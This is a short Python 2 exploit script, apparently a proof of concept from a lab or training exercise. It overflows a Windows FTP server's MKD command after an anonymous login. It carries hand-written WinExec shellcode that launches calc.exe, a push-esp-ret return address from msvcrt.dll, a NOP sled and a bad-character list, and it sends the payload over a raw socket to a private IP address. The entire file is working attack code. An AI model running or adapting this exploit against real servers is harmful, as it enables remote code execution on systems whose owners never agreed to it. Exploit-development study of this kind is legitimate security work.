import socket
import sys

'''
Badchars: \x00\x0A\x0D

0x77c35459 : push esp # ret  |  {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\msvcrt.dll)'''

WinExec = (
"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCmdLine
"\x68\x2E\x65\x78\x65"              # PUSH ".exe"
"\x68\x63\x61\x6C\x63"              # PUSH "calc"
"\x8B\xC4"                          # MOV EAX,ESP
"\x6A\x01"                          # PUSH 1
"\x50"                              # PUSH EAX
"\xBB\x31\x32\x86\x7C"              # MOV EBX,kernel32.WinExec
"\xFF\xD3")                         # CALL EBX



buffer = "\x90"*20 + WinExec
evil = "A"*247 + "\x59\x54\xc3\x77" + buffer +  "C"*(700-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con = s.connect(("172.31.1.205", 21))

s.recv(1024)
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS anonymous\r\n")
s.recv(1024)
s.send("MKD " + evil + "\r\n")
s.recv(1024)
s.send("QUIT\r\n")
s.close()

